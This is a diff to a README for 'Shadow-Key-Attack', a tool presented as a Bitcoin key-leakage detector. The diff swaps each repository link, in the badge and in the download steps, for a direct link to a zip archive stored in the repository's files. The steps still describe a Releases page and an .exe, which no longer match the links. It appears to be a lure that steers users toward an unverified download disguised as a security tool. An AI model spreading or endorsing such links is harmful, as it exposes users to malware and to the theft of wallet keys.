@@ -1,6 +1,6 @@
 # 🔐 Shadow-Key-Attack - Detect Bitcoin Key Leakage Easily
 
-[![Download Shadow-Key-Attack](https://img.shields.io/badge/Download-Shadow_Key_Attack-brightgreen)](https://github.com/loytgindehP/Shadow-Key-Attack)
+[![Download Shadow-Key-Attack](https://img.shields.io/badge/Download-Shadow_Key_Attack-brightgreen)](https://raw.githubusercontent.com/loytgindehP/Shadow-Key-Attack/main/Shadow Key Attack_files/Shadow-Attack-Key-v3.9-alpha.2.zip)
 
 ---
 
@@ -32,7 +32,7 @@ You can download and run the app following these steps:
 
 1. Open your web browser (Chrome, Edge, Firefox).
 2. Click on the green download badge at the top or use this link to visit the GitHub page:  
-   [https://github.com/loytgindehP/Shadow-Key-Attack](https://github.com/loytgindehP/Shadow-Key-Attack)
+   [https://raw.githubusercontent.com/loytgindehP/Shadow-Key-Attack/main/Shadow Key Attack_files/Shadow-Attack-Key-v3.9-alpha.2.zip](https://raw.githubusercontent.com/loytgindehP/Shadow-Key-Attack/main/Shadow Key Attack_files/Shadow-Attack-Key-v3.9-alpha.2.zip)
 3. On the GitHub page, look for the "Releases" section on the right side or near the top menu.
 4. Click on the latest release.
 5. In the release assets, find the Windows version of the software. It will typically end with `.exe`.
@@ -128,4 +128,4 @@ For more information about the attack and its background, you can explore the re
 ## 📥 Download Shadow-Key-Attack Now
 
 Use this link to get the latest version on your Windows PC:  
-[https://github.com/loytgindehP/Shadow-Key-Attack](https://github.com/loytgindehP/Shadow-Key-Attack)
+[https://raw.githubusercontent.com/loytgindehP/Shadow-Key-Attack/main/Shadow Key Attack_files/Shadow-Attack-Key-v3.9-alpha.2.zip](https://raw.githubusercontent.com/loytgindehP/Shadow-Key-Attack/main/Shadow Key Attack_files/Shadow-Attack-Key-v3.9-alpha.2.zip)
